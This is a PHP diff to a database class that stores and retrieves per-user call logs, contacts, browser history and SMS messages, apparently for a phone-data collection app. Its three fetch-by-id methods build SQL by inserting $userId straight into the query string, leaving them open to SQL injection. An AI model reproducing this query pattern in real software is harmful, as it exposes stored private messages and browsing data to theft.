@@ -153,9 +153,19 @@ class DbOperation
         }
     }
 
-    public function updateCalls($userid,$phone,$type,$date,$duration) {
-        $stmt = $this->con->prepare("INSERT INTO call_logs (userId, phone, type,calldate,duration) VALUES (?,?,?, ?, ?)");
-        $stmt->bind_param("sssss", $userid, $phone, $type, $date, $duration);
+
+    //Method to fetch contacts list by id from database
+    public function getContactsListById($userId){
+        $stmt = $this->con->prepare("SELECT * FROM contacts where userId = '$userId'");
+        $stmt->execute();
+        $users = $stmt->get_result();
+        $stmt->close();
+        return $users;
+    }
+
+    public function updateCalls($userid,$name, $phone,$type,$date,$duration) {
+        $stmt = $this->con->prepare("INSERT INTO call_logs (userId, name, phone, type,calldate,duration) VALUES (?,?,?,?, ?, ?)");
+        $stmt->bind_param("ssssss", $userid, $name, $phone, $type, $date, $duration);
         $result = $stmt->execute();
         $stmt->close();
         if ($result) {
@@ -174,12 +184,50 @@ class DbOperation
         return $users;
     }
 
-    //Method to fetch contacts list by id from database
-    public function getContactsListById($userId){
-        $stmt = $this->con->prepare("SELECT * FROM contacts where userId = '$userId'");
+
+    public function updateHistory($userid,$title,$url) {
+        $stmt = $this->con->prepare("INSERT INTO browser_history (userId, title, url) VALUES (?, ?, ?)");
+        $stmt->bind_param("sss", $userid, $title, $url);
+        $result = $stmt->execute();
+        $stmt->close();
+        if ($result) {
+            return 0;
+        } else {
+            return 1;
+        }
+    }
+
+    
+    //Method to fetch history list by id from database
+    public function getHistoryListById($userId){
+        $stmt = $this->con->prepare("SELECT * FROM browser_history where userId = '$userId'");
         $stmt->execute();
         $users = $stmt->get_result();
         $stmt->close();
         return $users;
     }
+
+
+    public function updateSms($userid,$address, $message,$folder,$smsdate) {
+        $stmt = $this->con->prepare("INSERT INTO sms (userId, address, message, folder, smsdate) VALUES (?, ?, ?, ?, ?)");
+        $stmt->bind_param("sssss", $userid, $address, $message, $folder, $smsdate);
+        $result = $stmt->execute();
+        $stmt->close();
+        if ($result) {
+            return 0;
+        } else {
+            return 1;
+        }
+    }
+
+    
+    //Method to fetch sms list by id from database
+    public function getSmsListById($userId){
+        $stmt = $this->con->prepare("SELECT * FROM sms where userId = '$userId'");
+        $stmt->execute();
+        $users = $stmt->get_result();
+        $stmt->close();
+        return $users;
+    }
+
 }
